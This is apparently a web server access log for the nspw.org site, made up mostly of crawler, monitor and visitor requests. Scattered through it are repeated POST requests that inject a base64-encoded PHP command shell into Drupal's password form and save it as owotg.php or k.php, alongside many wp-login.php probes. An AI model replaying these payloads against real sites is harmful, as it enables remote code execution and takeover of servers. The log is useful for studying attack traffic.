www.nspw.org:80 201.183.151.49 - - [30/Apr/2018:10:25:06 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:25:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:10:25:11 -0400] "GET /2015/accepted HTTP/1.1" 302 514 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 123.246.195.195 - - [30/Apr/2018:10:25:12 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 123.246.195.195 - - [30/Apr/2018:10:25:14 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 109.168.187.161 - - [30/Apr/2018:10:25:30 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 109.168.187.161 - - [30/Apr/2018:10:25:33 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.15 - - [30/Apr/2018:10:26:23 -0400] "GET /themes/garland/style.css?p7kfx6 HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:27:29 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:27:29 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:10:27:59 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 103.84.83.2 - - [30/Apr/2018:10:29:39 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 103.84.83.2 - - [30/Apr/2018:10:29:44 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:30:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.236 - - [30/Apr/2018:10:30:27 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:10:32:32 -0400] "GET /2005/local.content HTTP/1.1" 302 565 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 160.177.121.31 - - [30/Apr/2018:10:32:38 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 160.177.121.31 - - [30/Apr/2018:10:32:39 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.252.137.232 - - [30/Apr/2018:10:34:28 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.252.137.232 - - [30/Apr/2018:10:34:31 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 35.226.23.240 - - [30/Apr/2018:10:34:39 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 52.186.11.100 - - [30/Apr/2018:10:34:54 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 52.186.11.100 - - [30/Apr/2018:10:34:55 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 40.77.167.210 - - [30/Apr/2018:10:35:05 -0400] "GET /papers/2009/nspw2009-misra.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:35:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 187.113.188.150 - - [30/Apr/2018:10:35:53 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 187.113.188.150 - - [30/Apr/2018:10:35:56 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 129.2.180.77 - - [30/Apr/2018:10:39:00 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 302 611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:40:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:40:23 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:40:25 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 77.88.47.40 - - [30/Apr/2018:10:41:04 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 77.88.47.40 - - [30/Apr/2018:10:41:08 -0400] "GET /favicon.ico HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 5.255.250.67 - - [30/Apr/2018:10:41:12 -0400] "GET /2005/tmp/?C=M;O=A HTTP/1.1" 302 563 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 115.133.15.14 - - [30/Apr/2018:10:42:30 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 115.133.15.14 - - [30/Apr/2018:10:42:34 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 171.76.39.155 - - [30/Apr/2018:10:43:28 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 171.76.39.155 - - [30/Apr/2018:10:43:33 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:45:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:10:48:29 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 180.87.210.18 - - [30/Apr/2018:10:48:34 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.87.210.18 - - [30/Apr/2018:10:48:37 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:10:49:06 -0400] "GET /current/index.shtml HTTP/1.1" 302 567 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:50:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:50:27 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:50:27 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 35.226.23.240 - - [30/Apr/2018:10:50:59 -0400] "GET /papers/1994/nspw1994-castano.pdf HTTP/1.1" 302 556 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:55:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 40.77.167.170 - - [30/Apr/2018:10:57:13 -0400] "GET /papers/2007/nspw2007-gay.pdf HTTP/1.1" 302 585 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.80 - - [30/Apr/2018:10:59:53 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:11:00:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:11:00:42 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:11:00:47 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 71.191.220.4 - - [30/Apr/2018:11:00:59 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 302 611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
www.nspw.org:80 35.226.23.240 - - [30/Apr/2018:11:01:21 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:03:24 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Go-http-client/1.1"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:03:38 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:03:39 -0400] "GET /2013/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:03:50 -0400] "GET /2017/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:03:54 -0400] "GET /current/ HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:03:57 -0400] "GET /2010/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:00 -0400] "GET /2015/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:07 -0400] "GET /2013 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:10 -0400] "GET /2011 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:12 -0400] "GET /2010 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:28 -0400] "GET /2006/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:31 -0400] "GET /2015 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:11:04:34 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:34 -0400] "GET /2017/program HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:11:04:35 -0400] "GET /2013 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:36 -0400] "GET / HTTP/1.1" 302 473 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:38 -0400] "GET /2014/cfp HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:40 -0400] "GET /2012 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:43 -0400] "GET /2008/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:45 -0400] "GET /2015/cfp HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:49 -0400] "GET /2005/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:54 -0400] "GET /2003/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 65.49.2.175 - - [30/Apr/2018:11:04:57 -0400] "GET /current/cfp.shtml HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:11:05:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.66.141 - - [30/Apr/2018:11:05:31 -0400] "GET /ylkdowphwvxacuy.html HTTP/1.1" 302 580 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 52.186.11.100 - - [30/Apr/2018:11:05:46 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 52.186.11.100 - - [30/Apr/2018:11:05:47 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 185.232.20.242 - - [30/Apr/2018:11:06:47 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [30/Apr/2018:11:06:48 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [30/Apr/2018:11:06:48 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:11:10:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 199.16.157.181 - - [30/Apr/2018:11:12:17 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.181 - - [30/Apr/2018:11:12:18 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:11:15:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.236 - - [30/Apr/2018:11:17:22 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 27.187.77.63 - - [30/Apr/2018:11:18:24 -0400] "GET /favicon.ico HTTP/1.1" 302 551 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 LBBROWSER"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:11:19:56 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:11:19:56 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:11:20:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:11:25:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 220.181.125.142 - - [30/Apr/2018:11:26:06 -0400] "GET /proceedings/1997 HTTP/1.1" 302 524 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 220.181.125.142 - - [30/Apr/2018:11:26:07 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 191.189.21.165 - - [30/Apr/2018:11:27:32 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 191.189.21.165 - - [30/Apr/2018:11:27:34 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 220.181.125.142 - - [30/Apr/2018:11:28:17 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 302 552 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 47.31.130.79 - - [30/Apr/2018:11:28:20 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 47.31.130.79 - - [30/Apr/2018:11:28:22 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 220.181.125.142 - - [30/Apr/2018:11:28:28 -0400] "GET /papers/2005/nspw2005-van_oorschot.pdf HTTP/1.1" 302 566 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 54.36.148.126 - - [30/Apr/2018:11:29:18 -0400] "GET /2017/organizers HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 144.82.8.44 - - [30/Apr/2018:11:29:48 -0400] "GET /2018/cfp HTTP/1.1" 302 545 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
www.nspw.org:80 128.16.5.5 - - [30/Apr/2018:11:29:56 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
www.nspw.org:80 ::1 - - [30/Apr/2018:11:29:56 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:11:30:04 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:11:30:05 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:11:30:07 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:11:30:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 86.126.206.140 - - [30/Apr/2018:11:30:36 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
